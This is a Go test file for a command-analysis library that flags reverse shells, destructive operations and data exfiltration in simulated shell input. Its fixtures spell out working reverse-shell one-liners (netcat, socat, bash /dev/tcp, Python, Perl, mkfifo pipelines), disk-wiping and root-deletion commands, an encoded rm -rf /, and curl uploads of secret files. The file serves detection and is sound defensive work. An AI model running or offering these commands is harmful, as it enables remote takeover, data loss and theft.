package analysis_test

import (
	"context"
	"errors"
	"path"
	"testing"

	"github.com/nullptrpanic/libcommand"
	"github.com/nullptrpanic/libcommand/analysis"
)

var (
	_ libcommand.Command = analysis.RM
	_ libcommand.Command = analysis.Poweroff
	_ libcommand.Command = analysis.Reboot
	_ libcommand.Command = analysis.Halt
	_ libcommand.Command = analysis.Shutdown
	_ libcommand.Command = analysis.Init
	_ libcommand.Command = analysis.Telinit
	_ libcommand.Command = analysis.Systemctl
	_ libcommand.Command = analysis.Mkfifo
	_ libcommand.Command = analysis.Cat
	_ libcommand.Command = analysis.NC
	_ libcommand.Command = analysis.Ncat
	_ libcommand.Command = analysis.Netcat
	_ libcommand.Command = analysis.Socat
	_ libcommand.Command = analysis.Find
	_ libcommand.Command = analysis.Mkfs
	_ libcommand.Command = analysis.Wipefs
	_ libcommand.Command = analysis.DD
	_ libcommand.Command = analysis.Shell
	_ libcommand.Command = analysis.Python
	_ libcommand.Command = analysis.Perl
	_ libcommand.Command = analysis.Curl
)

func TestDetectionErrorReportsRiskType(t *testing.T) {
	tests := []*struct {
		riskType analysis.RiskType
		want     string
	}{
		{riskType: analysis.RiskTypeReverseShell, want: `command risk detected: "command": reverse_shell`},
		{riskType: analysis.RiskTypeDestructiveOperation, want: `command risk detected: "command": destructive_operation`},
		{riskType: analysis.RiskTypeSensitiveInformationDisclosure, want: `command risk detected: "command": sensitive_information_disclosure`},
		{riskType: analysis.RiskTypeDataExfiltration, want: `command risk detected: "command": data_exfiltration`},
	}
	for _, test := range tests {
		err := (&analysis.DetectionError{Command: "command", Type: test.riskType}).Error()
		if err != test.want {
			t.Fatalf("error = %q, want %q", err, test.want)
		}
	}
}

func TestCommandsDetectTheirHighRiskInvocations(t *testing.T) {
	tests := []*struct {
		name        string
		commandName string
		command     libcommand.Command
		source      string
		riskType    analysis.RiskType
	}{
		{name: "recursive root deletion", commandName: "rm", command: analysis.RM, source: `rm -rf /`, riskType: "destructive_operation"},
		{name: "recursive current root deletion", commandName: "rm", command: analysis.RM, source: `cd /; rm --recursive -- .`, riskType: "destructive_operation"},
		{name: "power off", commandName: "poweroff", command: analysis.Poweroff, source: `poweroff`, riskType: "destructive_operation"},
		{name: "reboot", commandName: "reboot", command: analysis.Reboot, source: `reboot`, riskType: "destructive_operation"},
		{name: "halt", commandName: "halt", command: analysis.Halt, source: `halt`, riskType: "destructive_operation"},
		{name: "shutdown", commandName: "shutdown", command: analysis.Shutdown, source: `shutdown now`, riskType: "destructive_operation"},
		{name: "init power off", commandName: "init", command: analysis.Init, source: `init 0`, riskType: "destructive_operation"},
		{name: "telinit reboot", commandName: "telinit", command: analysis.Telinit, source: `telinit 6`, riskType: "destructive_operation"},
		{name: "systemctl power off", commandName: "systemctl", command: analysis.Systemctl, source: `systemctl poweroff`, riskType: "destructive_operation"},
		{name: "netcat exec shell", commandName: "nc", command: analysis.NC, source: `nc -e /bin/sh 10.0.0.1 4444`, riskType: "reverse_shell"},
		{name: "ncat exec shell", commandName: "ncat", command: analysis.Ncat, source: `ncat --exec=/bin/sh 10.0.0.1 4444`, riskType: "reverse_shell"},
		{name: "netcat long name", commandName: "netcat", command: analysis.Netcat, source: `netcat -c /bin/sh 10.0.0.1 4444`, riskType: "reverse_shell"},
		{name: "socat exec shell", commandName: "socat", command: analysis.Socat, source: `socat TCP:10.0.0.1:4444 EXEC:/bin/sh`, riskType: "reverse_shell"},
		{name: "find deletes root", commandName: "find", command: analysis.Find, source: `find / -delete`, riskType: "destructive_operation"},
		{name: "find deletes current root", commandName: "find", command: analysis.Find, source: `cd /; find . -delete`, riskType: "destructive_operation"},
		{name: "format block device", commandName: "mkfs.ext4", command: analysis.Mkfs, source: `mkfs.ext4 /dev/sda1`, riskType: "destructive_operation"},
		{name: "format root block device", commandName: "mkfs", command: analysis.Mkfs, source: `mkfs /dev/root`, riskType: "destructive_operation"},
		{name: "wipe block signatures", commandName: "wipefs", command: analysis.Wipefs, source: `wipefs --all /dev/nvme0n1`, riskType: "destructive_operation"},
		{name: "wipe block signatures with combined options", commandName: "wipefs", command: analysis.Wipefs, source: `wipefs -af /dev/sda`, riskType: "destructive_operation"},
		{name: "dd writes block device", commandName: "dd", command: analysis.DD, source: `dd if=/dev/zero of=/dev/vda`, riskType: "destructive_operation"},
		{name: "dd writes BSD disk", commandName: "dd", command: analysis.DD, source: `dd if=/dev/zero of=/dev/disk0`, riskType: "destructive_operation"},
		{name: "dd redirects to block device", commandName: "dd", command: analysis.DD, source: `dd if=/dev/zero >/dev/sdb`, riskType: "destructive_operation"},
		{name: "shell network channel", commandName: "sh", command: analysis.Shell, source: `sh -i >& /dev/tcp/10.0.0.1/4444 0>&1`, riskType: "reverse_shell"},
		{
			name:        "python socket launches shell",
			commandName: "python3",
			command:     analysis.Python,
			source:      `python3 -c 'import os,socket,pty;s=socket.socket();s.connect(("198.51.100.42",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'`,
			riskType:    "reverse_shell",
		},
		{
			name:        "perl socket launches shell",
			commandName: "perl",
			command:     analysis.Perl,
			source:      `perl -e 'use Socket;$i="198.51.100.42";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'`,
			riskType:    "reverse_shell",
		},
		{
			name:        "curl uploads file",
			commandName: "curl",
			command:     analysis.Curl,
			source:      `curl --upload-file ./secret.txt https://example.com/upload`,
			riskType:    "data_exfiltration",
		},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			err := simulate(t, test.source, map[string]libcommand.Command{test.commandName: test.command})
			if !errors.Is(err, analysis.ErrRiskDetected) {
				t.Fatalf("error = %v, want ErrRiskDetected", err)
			}
			var detection *analysis.DetectionError
			if !errors.As(err, &detection) {
				t.Fatalf("error = %T %v, want *DetectionError", err, err)
			}
			if detection.Command != test.commandName || detection.Type != test.riskType {
				t.Fatalf("detection = %#v, want command %q and type %q", detection, test.commandName, test.riskType)
			}
		})
	}
}

func TestOnlyRegisteredAnalysisCommandsAreEnabled(t *testing.T) {
	err := simulate(t, `poweroff`, map[string]libcommand.Command{"rm": analysis.RM})
	if err != nil {
		t.Fatalf("unregistered poweroff analysis returned %v", err)
	}
}

func TestCurlDetectsFileBackedUploads(t *testing.T) {
	tests := []*struct {
		name   string
		source string
	}{
		{name: "short upload file", source: `curl -T ./secret.txt https://example.com/upload`},
		{name: "attached short upload file", source: `curl -T./secret.txt https://example.com/upload`},
		{name: "long upload file", source: `curl --upload-file=./secret.txt https://example.com/upload`},
		{name: "data file", source: `curl --data @./secret.txt https://example.com/upload`},
		{name: "binary data file", source: `curl --data-binary=@./secret.bin https://example.com/upload`},
		{name: "JSON file", source: `curl --json @./secret.json https://example.com/upload`},
		{name: "multipart file", source: `curl -F attachment=@./secret.txt https://example.com/upload`},
		{name: "multipart file contents", source: `curl --form 'attachment=<./secret.txt' https://example.com/upload`},
		{name: "URL encoded file", source: `curl --data-urlencode field@./secret.txt https://example.com/upload`},
		{name: "stdin upload", source: `cat ./secret.txt | curl --upload-file - https://example.com/upload`},
		{name: "stdin data", source: `cat ./secret.txt | curl --data-binary @- https://example.com/upload`},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			err := simulate(t, test.source, map[string]libcommand.Command{"curl": analysis.Curl})
			if !errors.Is(err, analysis.ErrRiskDetected) {
				t.Fatalf("error = %v, want ErrRiskDetected", err)
			}
			var detection *analysis.DetectionError
			if !errors.As(err, &detection) || detection.Command != "curl" || detection.Type != analysis.RiskTypeDataExfiltration {
				t.Fatalf("detection = %#v, want curl data_exfiltration", detection)
			}
		})
	}
}

func TestRMDetectsDecodedPipelineExecutedByShell(t *testing.T) {
	err := simulate(t, `echo 'cm0gLXJmIC8=' | base64 -d | sh`, map[string]libcommand.Command{"rm": analysis.RM})
	if !errors.Is(err, analysis.ErrRiskDetected) {
		t.Fatalf("error = %v, want ErrRiskDetected", err)
	}
	var detection *analysis.DetectionError
	if !errors.As(err, &detection) || detection.Command != "rm" {
		t.Fatalf("detection = %#v, want decoded rm invocation", detection)
	}
}

func TestAnalysisSeesCommandsNestedThroughExecutionWrappers(t *testing.T) {
	err := simulate(t, `sudo sh -c 'setsid rm -rf /'`, map[string]libcommand.Command{"rm": analysis.RM})
	if !errors.Is(err, analysis.ErrRiskDetected) {
		t.Fatalf("error = %v, want ErrRiskDetected", err)
	}
	var detection *analysis.DetectionError
	if !errors.As(err, &detection) || detection.Command != "rm" {
		t.Fatalf("detection = %#v, want nested rm invocation", detection)
	}
}

func TestSessionDetectsFIFOReverseShellWithoutTrace(t *testing.T) {
	commands := map[string]libcommand.Command{
		"rm":     analysis.RM,
		"mkfifo": analysis.Mkfifo,
		"cat":    analysis.Cat,
		"bash":   analysis.Shell,
		"sh":     analysis.Shell,
		"nc":     analysis.NC,
		"ncat":   analysis.Ncat,
	}
	lookup := func(name string) libcommand.Command {
		return commands[path.Base(name)]
	}
	simulateWithSession := func(source string) error {
		session := analysis.NewSession()
		middleware := func(next libcommand.Command) libcommand.Command {
			return func(ctx context.Context, shell *libcommand.CommandContext, invocation *libcommand.Invocation) (*libcommand.CommandResult, error) {
				if err := analysis.Inspect(ctx, shell, invocation, lookup(invocation.Name)); err != nil {
					return nil, err
				}
				return next(ctx, shell, invocation)
			}
		}
		ctx := analysis.WithSession(context.Background(), session)
		return libcommand.NewBuilder().
			Middleware(middleware).
			Build().
			Simulate(ctx, &libcommand.SimulationRequest{Source: source})
	}

	attacks := []string{
		`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 101.132.185.173 18889 > /tmp/f`,
		`mkfifo /tmp/f; if maybe; then cat /tmp/f | sh -i | ncat host 18889 > /tmp/f; fi`,
		`mkfifo /tmp/f; if [[ $RANDOM ]]; then if [[ $RANDOM ]]; then cat /tmp/f | bash -i | nc host 18889 > /tmp/f; fi; fi`,
	}
	for _, attack := range attacks {
		err := simulateWithSession(attack)
		var detection *analysis.DetectionError
		if !errors.As(err, &detection) || detection.Type != analysis.RiskTypeReverseShell {
			t.Fatalf("attack %q: error = %v, detection = %#v; want reverse_shell", attack, err, detection)
		}
	}

	safe := []string{
		"mkfifo /tmp/f\ncat /tmp/f\nbash -i <<< \"$UNRESOLVED\"\nnc host 18889 <<< \"$UNRESOLVED\" > /tmp/f",
		"mkfifo /tmp/f\ncat /tmp/f\nbash -i\nnc host 18889 > /tmp/f",
		`mkfifo /tmp/f; cat /tmp/f | bash -i </tmp/input | nc host 18889 > /tmp/f`,
		`mkfifo /tmp/f; cat /tmp/f | bash -i | nc host 18889 > /tmp/other`,
		`mkfifo /tmp/f; rm -f /tmp/f; cat /tmp/f | bash -i | nc host 18889 > /tmp/f`,
	}
	for _, source := range safe {
		if err := simulateWithSession(source); err != nil {
			t.Fatalf("safe source %q returned %v, want no detection", source, err)
		}
	}
}

func TestDeleteAnalysisResolvesRelativeTargetsAgainstWorkingDirectory(t *testing.T) {
	tests := []*struct {
		name        string
		workingDir  string
		source      string
		commandName string
		command     libcommand.Command
		risk        bool
	}{
		{name: "rm parent reaches root", workingDir: "/workspace", source: `rm -rf ..`, commandName: "rm", command: analysis.RM, risk: true},
		{name: "rm current directory stays nested", workingDir: "/workspace", source: `rm -rf .`, commandName: "rm", command: analysis.RM},
		{name: "find parent reaches root", workingDir: "/workspace", source: `find .. -delete`, commandName: "find", command: analysis.Find, risk: true},
		{name: "find current directory stays nested", workingDir: "/workspace", source: `find . -delete`, commandName: "find", command: analysis.Find},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			err := simulateRequest(t, &libcommand.SimulationRequest{
				Source:     test.source,
				WorkingDir: test.workingDir,
			}, map[string]libcommand.Command{test.commandName: test.command})
			if got := errors.Is(err, analysis.ErrRiskDetected); got != test.risk {
				t.Fatalf("risk detected = %v, want %v (error %v)", got, test.risk, err)
			}
		})
	}
}

func TestDeleteAnalysisDoesNotConcretizeUnresolvedWorkingDirectory(t *testing.T) {
	shell := new(libcommand.CommandContext)
	_, err := analysis.RM(context.Background(), shell, &libcommand.Invocation{
		Name: "rm",
		Args: []*libcommand.Argument{
			{Kind: libcommand.ArgumentString, Value: "-rf"},
			{Kind: libcommand.ArgumentString, Value: "."},
		},
		Dir:        "/",
		Unresolved: &libcommand.InvocationUnresolved{Dir: true},
	})
	if errors.Is(err, analysis.ErrRiskDetected) {
		t.Fatalf("error = %v, unresolved working directory must not be treated as root", err)
	}

	_, err = analysis.RM(context.Background(), shell, &libcommand.Invocation{
		Name: "rm",
		Args: []*libcommand.Argument{
			{Kind: libcommand.ArgumentString, Value: "-rf"},
			{Kind: libcommand.ArgumentString, Value: "/"},
		},
		Unresolved: &libcommand.InvocationUnresolved{Dir: true},
	})
	if !errors.Is(err, analysis.ErrRiskDetected) {
		t.Fatalf("error = %v, absolute root is independent of the working directory", err)
	}

	_, err = analysis.Mkfs(context.Background(), shell, &libcommand.Invocation{
		Name: "mkfs",
		Args: []*libcommand.Argument{
			{Kind: libcommand.ArgumentString, Value: "/dev/sda"},
		},
		Unresolved: &libcommand.InvocationUnresolved{Dir: true},
	})
	if !errors.Is(err, analysis.ErrRiskDetected) {
		t.Fatalf("error = %v, absolute block device is independent of the working directory", err)
	}
}

func TestCommandsLeaveSafeAndUnresolvedInvocationsUnresolved(t *testing.T) {
	tests := []*struct {
		name        string
		commandName string
		command     libcommand.Command
		source      string
	}{
		{name: "rm below root", commandName: "rm", command: analysis.RM, source: `rm -rf /tmp/cache`},
		{name: "rm root without recursion", commandName: "rm", command: analysis.RM, source: `rm -f /`},
		{name: "rm unresolved target", commandName: "rm", command: analysis.RM, source: `rm -rf "$RANDOM"`},
		{name: "shutdown cancellation", commandName: "shutdown", command: analysis.Shutdown, source: `shutdown -c`},
		{name: "systemctl status", commandName: "systemctl", command: analysis.Systemctl, source: `systemctl status poweroff`},
		{name: "netcat without exec", commandName: "nc", command: analysis.NC, source: `nc 10.0.0.1 4444`},
		{name: "netcat executes non-shell program", commandName: "nc", command: analysis.NC, source: `nc -e /usr/bin/uptime 10.0.0.1 4444`},
		{name: "socat executes non-shell program", commandName: "socat", command: analysis.Socat, source: `socat TCP:10.0.0.1:4444 EXEC:/usr/bin/uptime`},
		{name: "find deletes temporary tree", commandName: "find", command: analysis.Find, source: `find /tmp/cache -delete`},
		{name: "mkfs creates file image", commandName: "mkfs.ext4", command: analysis.Mkfs, source: `mkfs.ext4 disk.img`},
		{name: "mkfs device-like file", commandName: "mkfs.ext4", command: analysis.Mkfs, source: `mkfs.ext4 /dev/disk-image`},
		{name: "wipefs lists signatures", commandName: "wipefs", command: analysis.Wipefs, source: `wipefs /dev/sda`},
		{name: "wipefs dry run", commandName: "wipefs", command: analysis.Wipefs, source: `wipefs --no-act --all /dev/sda`},
		{name: "wipefs combined dry run", commandName: "wipefs", command: analysis.Wipefs, source: `wipefs -an /dev/sda`},
		{name: "wipefs loop control", commandName: "wipefs", command: analysis.Wipefs, source: `wipefs --all /dev/loop-control`},
		{name: "dd writes ordinary file", commandName: "dd", command: analysis.DD, source: `dd if=/dev/zero of=disk.img`},
		{name: "dd writes device-like file", commandName: "dd", command: analysis.DD, source: `dd if=/dev/zero of=/dev/sdcard-image`},
		{name: "dd writes null device", commandName: "dd", command: analysis.DD, source: `dd if=/dev/zero of=/dev/null`},
		{name: "ordinary interactive shell", commandName: "bash", command: analysis.Shell, source: `bash -i`},
		{name: "non-interactive shell pipeline", commandName: "bash", command: analysis.Shell, source: `producer | bash`},
		{name: "interactive shell with local pipeline input", commandName: "bash", command: analysis.Shell, source: `producer | bash -i`},
		{name: "interactive shell output-only network redirect", commandName: "bash", command: analysis.Shell, source: `bash -i >/dev/tcp/10.0.0.1/4444`},
		{name: "interactive shell closes network input", commandName: "bash", command: analysis.Shell, source: `bash -i 0</dev/tcp/10.0.0.1/4444 0<&-`},
		{name: "interactive shell replaces network input", commandName: "bash", command: analysis.Shell, source: `bash -i 0</dev/tcp/10.0.0.1/4444 0</tmp/input`},
		{name: "socat local shell", commandName: "socat", command: analysis.Socat, source: `socat STDIO EXEC:/bin/sh`},
		{name: "python network client", commandName: "python3", command: analysis.Python, source: `python3 -c 'import socket; print(socket.gethostname())'`},
		{name: "python local shell", commandName: "python3", command: analysis.Python, source: `python3 -c 'import subprocess; subprocess.run(["/bin/bash", "-lc", "echo ok"])'`},
		{name: "perl network client", commandName: "perl", command: analysis.Perl, source: `perl -e 'use Socket; print "socket support\n";'`},
		{name: "network redirect alone", commandName: "nc", command: analysis.NC, source: `nc >/dev/tcp/10.0.0.1/4444`},
		{name: "curl GET", commandName: "curl", command: analysis.Curl, source: `curl https://example.com/file`},
		{name: "curl inline data", commandName: "curl", command: analysis.Curl, source: `curl --data 'key=value' https://example.com/form`},
		{name: "curl inline form", commandName: "curl", command: analysis.Curl, source: `curl -F 'key=value' https://example.com/form`},
		{name: "curl literal form string", commandName: "curl", command: analysis.Curl, source: `curl --form-string 'attachment=@./secret.txt' https://example.com/form`},
		{name: "curl raw at data", commandName: "curl", command: analysis.Curl, source: `curl --data-raw '@not-a-file' https://example.com/form`},
		{name: "curl URL encoded literal", commandName: "curl", command: analysis.Curl, source: `curl --data-urlencode 'field=user@example.com' https://example.com/form`},
		{name: "curl empty upload source", commandName: "curl", command: analysis.Curl, source: `curl --upload-file '' https://example.com/upload`},
		{name: "curl unresolved upload source", commandName: "curl", command: analysis.Curl, source: `curl --upload-file "$RANDOM" https://example.com/upload`},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			if err := simulate(t, test.source, map[string]libcommand.Command{test.commandName: test.command}); err != nil {
				t.Fatalf("Simulate() error = %v", err)
			}
		})
	}
}

func simulate(t *testing.T, source string, commands map[string]libcommand.Command) error {
	t.Helper()
	return simulateRequest(t, &libcommand.SimulationRequest{Source: source}, commands)
}

func simulateRequest(t *testing.T, request *libcommand.SimulationRequest, commands map[string]libcommand.Command) error {
	t.Helper()
	builder := libcommand.NewBuilder()
	for name, command := range commands {
		builder.Command(name, command)
	}
	return builder.Build().Simulate(context.Background(), request)
}
